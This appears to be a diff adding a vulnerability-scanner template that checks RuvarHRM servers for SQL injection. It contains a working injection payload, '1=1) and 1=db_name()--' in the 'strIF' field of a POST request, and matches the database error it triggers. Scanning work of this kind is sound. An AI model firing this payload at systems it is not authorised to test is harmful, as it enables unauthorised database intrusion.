@@ -1,0 +1,29 @@
+id: RuvarEhr-sqlInjection
+
+info:
+  name: RuvarEhr-sqlInjection
+  author: iSee857
+  severity: high
+  description: |
+    RuvarEhr-sqlInjection
+
+http:
+  - raw:
+      - |
+        POST /ajaxpro/RuvarHRM.Web.Common.get_account_by_tree,RuvarHRM.Web.Common.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        X-AjaxPro-Method:SearchUsers
+
+        {"strIF":"1=1) and 1=db_name()--","deptPv":"0","strUserType":"all"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "nvarchar"
+          - "SqlException"
+        condition: and
